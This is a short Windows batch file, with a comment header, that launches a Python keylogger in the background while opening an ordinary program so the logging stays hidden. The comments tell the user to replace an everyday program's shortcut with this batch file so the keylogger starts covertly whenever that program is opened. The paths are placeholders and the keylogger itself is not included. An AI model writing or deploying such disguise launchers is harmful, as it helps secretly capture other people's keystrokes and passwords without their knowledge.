GOTO EndOfComments
This bat file is meant to run the python key-logger in the background,
while starting some common program at the same time to disguise it!
Simply replace the first path with the path to the key-logger.pyw file,
and replace the second path with the path to some executable.
After, replace, the shortcut of the aforementioned executable to run this batch file,
which will run the key-logger in disguise!
:EndOfComments

@echo off
start "" "path_to_key_logger_program"
start "" "path_to_program_to_start_key_logger_program"